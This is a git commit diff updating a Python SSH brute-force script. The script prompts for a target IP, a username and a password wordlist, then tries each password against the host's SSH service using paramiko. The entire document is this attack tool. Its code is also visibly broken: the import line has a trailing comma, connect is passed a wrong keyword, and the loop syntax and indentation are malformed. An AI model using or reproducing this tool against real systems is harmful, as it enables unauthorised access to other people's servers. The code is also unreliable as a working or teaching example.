f2b1300e12841092ba8319f55c20e0c7e5085936
Z333RO <82729059+Z333RO@users.noreply.github.com>
2022-11-20 09:55:36 -0800

    Updatet ssh_bruteforce.py

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -1,4 +1,18 @@
-import paramiko, sys, os, socket, termcolor
+import paramiko, sys, os, socket,
+
+def ssh_connect(passw, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(host, port=22, username=username, passw=passw)
+    except paramiko.AuthenticationException:
+        code = 1
+    except socket.error as e:
+        code = 2
+
+    ssh.close()
+    return code
 
 host = input('[+] Enter the IP of target: ')
 username = input('[+] Enter the SSH username: ')
@@ -12,4 +26,4 @@ with open(wordlist, 'r') as file:
     for line in file.readlines()
         passw = line.strip()
             try:
-                ssh_connect(passw)
+                response = ssh_connect(passw)
